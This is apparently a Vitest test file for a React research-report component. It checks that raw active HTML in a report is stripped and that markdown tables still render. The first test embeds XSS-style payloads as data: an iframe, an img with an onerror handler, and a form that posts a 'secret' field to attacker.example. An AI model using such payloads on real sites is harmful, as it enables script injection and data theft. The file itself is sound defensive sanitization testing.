import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it, vi } from 'vitest';

import ResearchReport from './ResearchReport';


const renderReport = (report: string): string => renderToStaticMarkup(
  <ResearchReport
    output={{ summary: '', details: { report } }}
    isResetting={false}
    isStreaming={false}
    glassStyle={{ base: '', card: '', input: '' }}
    fadeInAnimation={{ fadeIn: '', writing: '' }}
    loaderColor="#468BFF"
    isGeneratingPdf={false}
    isCopied={false}
    onCopyToClipboard={vi.fn()}
    onGeneratePdf={vi.fn()}
  />,
);


describe('ResearchReport', () => {
  it('不渲染报告中的原始主动 HTML', () => {
    const html = renderReport(`
# 安全报告

<iframe src="https://attacker.example/frame"></iframe>
<img src="https://attacker.example/pixel" onerror="alert(1)">
<form action="https://attacker.example/collect"><input name="secret"></form>
`);

    expect(html).not.toContain('<iframe');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('<form');
    expect(html).not.toContain('<input');
    expect(html).not.toContain('attacker.example');
  });

  it('继续渲染 GFM 表格', () => {
    const html = renderReport('| 字段 | 内容 |\n| --- | --- |\n| 状态 | 正常 |');

    expect(html).toContain('<table>');
    expect(html).toContain('<td>正常</td>');
  });
});
